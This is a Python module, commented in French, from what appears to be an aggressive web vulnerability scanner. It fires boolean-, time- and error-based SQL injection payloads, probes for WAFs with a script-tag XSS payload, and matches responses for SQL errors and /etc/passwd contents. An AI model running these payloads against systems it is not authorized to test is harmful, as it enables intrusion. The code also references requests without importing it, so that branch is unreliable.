#!/usr/bin/env python3
"""
🔍 DÉTECTION COMPORTEMENTALE ULTRA-AGRESSIVE — OWASP A05:2025
Analyse aveugle (blind) + time-based + différence de contenu
Intègre tes techniques de scan_get_vuln.py
"""

import time
import re
from colorama import Fore, Style

class AdvancedDetector:
    def __init__(self, engine):
        self.engine = engine
        self.session = engine.session
    
    def detect_blind_injection(self, param, technique='boolean', aggressive=False):
        """
        Détection aveugle adaptative — polymorphique selon le type d'injection
        """
        baseline = self.engine.get_baseline()
        baseline_time = baseline.elapsed.total_seconds()
        
        if technique == 'boolean':
            # Payloads boolean-based polymorphiques (tes patterns de scan_get_vuln.py)
            true_payloads = [
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' OR 'x'='x",
                "') OR ('x'='x",
            ]
            
            false_payloads = [
                "' OR '1'='2",
                "\" OR \"1\"=\"2",
                "' AND '1'='2",
                "\" AND \"1\"=\"2",
            ]
            
            for true_p, false_p in zip(true_payloads[:3], false_payloads[:3]):
                true_url = self.engine.build_url(param, true_p)
                false_url = self.engine.build_url(param, false_p)
                
                try:
                    true_resp = self.session.get(true_url, timeout=10)
                    false_resp = self.session.get(false_url, timeout=10)
                    
                    # Analyse polymorphique de différence
                    similarity = self._calculate_similarity(true_resp.text, false_resp.text)
                    content_diff = self._content_differs(true_resp.text, false_resp.text)
                    
                    if similarity < 0.6 or content_diff:
                        evidence = f"Boolean-based blind détecté (similarité={similarity:.2f})"
                        return True, evidence, true_p
                
                except:
                    continue
        
        elif technique == 'time':
            # Payloads time-based polymorphiques (tes patterns de scan_get_vuln.py)
            time_payloads = [
                "' OR IF(1=1,SLEEP(3),0)--",
                "\" OR IF(1=1,SLEEP(3),0)--",
                "' AND SLEEP(3)--",
                "\" AND SLEEP(3)--",
                "' OR (SELECT SLEEP(3))--",
                "1; WAITFOR DELAY '0:0:3'--",
            ]
            
            if aggressive:
                time_payloads += [
                    "' OR BENCHMARK(5000000,MD5(1))--",
                    "\" OR BENCHMARK(5000000,MD5(1))--",
                    "1' UNION SELECT SLEEP(3)--",
                ]
            
            for payload in time_payloads:
                time_url = self.engine.build_url(param, payload)
                
                try:
                    start = time.time()
                    self.session.get(time_url, timeout=15)
                    elapsed = time.time() - start
                    
                    if elapsed > 3.5:
                        evidence = f"Time-based blind détecté ({elapsed:.2f}s)"
                        return True, evidence, payload
                
                except requests.exceptions.Timeout:
                    evidence = "Time-based blind détecté (timeout)"
                    return True, evidence, payload
                except:
                    continue
        
        return False, "Aucune vulnérabilité aveugle détectée", None
    
    def _calculate_similarity(self, text1, text2):
        """Calcul de similarité rapide — optimisé pour perf"""
        if not text1 or not text2:
            return 0.0
        
        # Normaliser et tronquer pour perf
        t1 = text1[:400].lower().replace(' ', '').replace('\n', '').replace('\r', '')
        t2 = text2[:400].lower().replace(' ', '').replace('\n', '').replace('\r', '')
        
        min_len = min(len(t1), len(t2))
        if min_len == 0:
            return 0.0
        
        # Ratio de caractères communs
        common = sum(1 for i in range(min_len) if t1[i] == t2[i])
        return common / min_len
    
    def _content_differs(self, text1, text2):
        """Détection de différence significative — seuil adaptable"""
        t1 = text1[:300].lower().replace(' ', '')
        t2 = text2[:300].lower().replace(' ', '')
        
        min_len = min(len(t1), len(t2))
        if min_len == 0:
            return False
        
        diff_count = sum(1 for i in range(min_len) if t1[i] != t2[i])
        return (diff_count / min_len) > 0.35  # Seuil agressif
    
    def detect_error_based(self, response_text):
        """
        Détection d'erreurs polymorphiques — 50+ patterns
        Intègre tes patterns de scan_get_vuln.py
        """
        # Patterns SQL (tes patterns boostés)
        sql_patterns = [
            'sql syntax.*?error', 'unclosed quotation', 'quoted string not properly terminated',
            'you have an error in your sql syntax', 'warning.*?mysql', 'mysql_fetch',
            'mysql_num_rows', 'pg_query', 'pg_num_rows', 'syntax error.*?postgresql',
            'microsoft sql server', 'odbc sql server driver', 'sql server.*?driver',
            'sqlstate', 'sqlexception', 'ora-[0-9]{5}', 'oracle.*?error',
            'sqlite3.*?error', 'sqlite_error', 'sql error', 'syntax error',
            'unexpected.*?token', 'unknown column', 'where clause', 'order clause',
            'group clause', 'having clause', 'limit clause', 'offset clause',
            'union.*?select', 'select.*?from', 'insert.*?into', 'update.*?set',
            'delete.*?from', 'drop table', 'create table', 'alter table',
        ]
        
        # Patterns XSS/command injection (tes patterns)
        xss_cmd_patterns = [
            'alert(1)', '<script>', 'onerror=', 'onload=', 'javascript:',
            'uid=', 'gid=', 'groups=', '/bin/bash', '/usr/bin', 'root:x:0:0',
            'daemon:x:1:', 'bin:x:2:', 'sys:x:3:', 'sync:x:4:', 'games:x:5:',
        ]
        
        # Vérifier patterns SQL
        for pattern in sql_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"Erreur SQL détectée: {pattern}"
        
        # Vérifier patterns XSS/command injection
        for pattern in xss_cmd_patterns:
            if pattern in response_text.lower():
                vuln_type = "XSS" if any(x in pattern for x in ['alert', 'script', 'onerror']) else "Command Injection"
                return True, f"{vuln_type} détecté: {pattern}"
        
        return False, "Aucune erreur détectée"
    
    def detect_waf(self):
        """
        Détection WAF/IPS — 15+ signatures
        Intègre tes techniques d'analyse de headers
        """
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', 'cf-request-id'],
            'ModSecurity': ['mod_security', 'modsecurity', 'mod_sec', 'secmod'],
            'AWS WAF': ['aws', 'amazon', 'x-amzn-requestid'],
            'Sucuri': ['sucuri', 'x-sucuri-id'],
            'Imperva': ['incapsula', 'x-cdn', 'x-iinfo'],
            'Akamai': ['akamai', 'akamai-g2o'],
            'F5 BIG-IP': ['x-waf-status', 'x-waf-deny'],
            'Barracuda': ['barra', 'x-barracuda'],
            'Fortinet': ['forti', 'x-fortiguard'],
            'Wordfence': ['wordfence', 'wf_'],
        }
        
        try:
            resp = self.session.get(self.engine.url, timeout=10)
            
            # Vérifier headers
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in str(resp.headers).lower():
                        return waf_name
            
            # Vérifier contenu
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in resp.text.lower():
                        return waf_name
            
            # Test actif (comme dans tes scripts)
            test_payload = "<script>alert(1)</script>"
            params = self.engine.discover_params()
            if params:
                test_url = self.engine.build_url(params[0], test_payload)
                if test_url:
                    test_resp = self.session.get(test_url, timeout=10)
                    if test_resp.status_code in [403, 406, 429, 503] or 'blocked' in test_resp.text.lower():
                        return "WAF inconnu (blocage détecté)"
        
        except:
            pass
        
        return None
    
    def adaptive_scan(self, param, aggressive=False):
        """
        Scan adaptatif ULTRA-AGRESSIF — combine toutes les techniques
        """
        print(f"  {Fore.BLUE}→ Scan adaptatif: {Fore.YELLOW}{param}{Style.RESET_ALL}")
        
        # Étape 1: Détection WAF
        waf = self.detect_waf()
        if waf:
            print(f"    {Fore.RED}[WAF] {Style.RESET_ALL}Détecté: {waf}")
        
        # Étape 2: Détection boolean-based
        vulnerable, evidence, payload = self.detect_blind_injection(param, 'boolean', aggressive)
        if vulnerable:
            return True, f"Boolean-based: {evidence}", payload
        
        # Étape 3: Détection time-based (si boolean échoue)
        vulnerable, evidence, payload = self.detect_blind_injection(param, 'time', aggressive)
        if vulnerable:
            return True, f"Time-based: {evidence}", payload
        
        # Étape 4: Détection error-based
        baseline = self.engine.get_baseline()
        error_payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1"]
        
        for payload in error_payloads:
            injected_url = self.engine.build_url(param, payload)
            if not injected_url:
                continue
            
            try:
                resp = self.session.get(injected_url, timeout=5)
                has_error, error_evidence = self.detect_error_based(resp.text)
                if has_error:
                    return True, f"Error-based: {error_evidence}", payload
            except:
                continue
        
        return False, "Aucune vulnérabilité détectée", None